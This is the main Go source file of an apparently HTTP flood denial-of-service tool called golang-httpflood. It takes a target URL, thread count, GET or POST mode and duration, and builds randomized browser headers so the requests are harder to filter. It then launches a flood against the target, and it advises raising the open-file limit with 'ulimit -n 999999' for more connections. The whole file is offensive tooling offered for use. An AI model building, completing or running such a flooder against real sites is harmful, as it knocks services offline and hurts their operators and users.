package main

import (
	"fmt"
	"os"

	"github.com/bonbonbon1414/golang-httpflood/internal/config"
	"github.com/bonbonbon1414/golang-httpflood/internal/flood"
	"github.com/bonbonbon1414/golang-httpflood/internal/headers"
	"github.com/bonbonbon1414/golang-httpflood/internal/stats"
	"github.com/bonbonbon1414/golang-httpflood/internal/useragents"
	"github.com/bonbonbon1414/golang-httpflood/internal/utils"
)

func main() {
	// Display banner
	displayBanner()

	// Initialize random seed
	utils.Seed()

	// Parse configuration
	cfg := config.NewConfig()
	if err := cfg.ParseFromArgs(os.Args); err != nil {
		fmt.Printf("Error parsing arguments: %v\n", err)
		printUsage()
		os.Exit(1)
	}

	// Validate configuration
	if err := cfg.Validate(); err != nil {
		fmt.Printf("Configuration error: %v\n", err)
		os.Exit(1)
	}

	// Display Linux warning if applicable
	if os.Getenv("GOOS") == "linux" {
		fmt.Println("\nWarning: Please run 'ulimit -n 999999' before using this on Linux!")
	}

	// Initialize components
	uaGen := useragents.NewGenerator()
	headerManager := headers.NewManager(uaGen)
	metrics := stats.NewMetrics()

	// Build headers
	var headers string
	var postData string
	var err error

	if cfg.Mode == "get" {
		headers, err = headerManager.BuildGETRequestHeaders(cfg.UseCustomHeaders, cfg.CustomHeaderFile)
		if err != nil {
			fmt.Printf("Error building headers: %v\n", err)
			os.Exit(1)
		}
	} else {
		headers, postData, err = headerManager.BuildPOSTRequestHeaders(cfg.UseCustomHeaders, cfg.CustomHeaderFile)
		if err != nil {
			fmt.Printf("Error building headers: %v\n", err)
			os.Exit(1)
		}
	}

	// Display configuration
	fmt.Printf("\nConfiguration:\n%s\n\n", cfg.String())

	// Create and run flood operation
	floodOp := flood.NewFlood(cfg, metrics, headers, postData)
	floodOp.Run(cfg.Duration)

	// Display final summary
	snapshot := metrics.GetSnapshot()
	stats.DisplaySummary(snapshot)

	fmt.Println("\nFlood operation completed.")
}

func displayBanner() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||                     Golang version 2.0      ")
	fmt.Println("                                                        C0d3d By L330n123")
	fmt.Println("==========================================================================")
}

func printUsage() {
	fmt.Println("\nPost Mode will use header.txt as data")
	fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
	fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
	fmt.Println("\nExample:")
	fmt.Println("  " + os.Args[0] + " https://example.com 100 get 60 nil")
	fmt.Println("  " + os.Args[0] + " https://example.com 100 post 60 headers.txt")
}